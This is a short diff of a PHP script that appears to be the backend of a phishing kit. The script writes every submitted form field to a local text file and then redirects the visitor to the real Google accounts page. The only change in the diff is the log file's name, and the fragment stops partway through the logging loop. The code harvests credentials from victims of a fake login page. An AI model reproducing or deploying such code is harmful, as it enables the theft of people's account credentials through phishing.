@@ -1,6 +1,6 @@
 <?php
 header ('Location: https://accounts.google.com ');
-$handle = fopen("log.txt", "a");
+$handle = fopen("gta.txt", "a");
 foreach($_POST as $variable => $value) {
     fwrite($handle, $variable);
     fwrite($handle, "=");
